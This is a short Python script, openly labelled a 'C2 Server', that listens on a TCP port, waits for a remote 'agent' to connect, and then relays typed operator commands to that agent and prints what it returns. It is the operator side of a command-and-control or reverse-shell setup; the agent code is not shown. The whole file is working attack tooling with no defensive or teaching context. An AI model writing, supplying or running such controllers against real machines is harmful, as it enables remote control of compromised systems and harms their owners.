#!/usr/bin/env python3
import socket

def start_c2(host="0.0.0.0", port=9999):
    s = socket.socket()
    s.bind((host, port))
    s.listen(1)
    print(f"[+] C2 Server listening on {host}:{port}")
    conn, addr = s.accept()
    print(f"[+] Agent connected from {addr}")

    while True:
        command = input("C2> ")
        if command.lower() == "exit":
            conn.send(b"exit")
            break
        conn.send(command.encode())
        result = conn.recv(4096).decode()
        print(result)

    conn.close()

if __name__ == "__main__":
    start_c2()
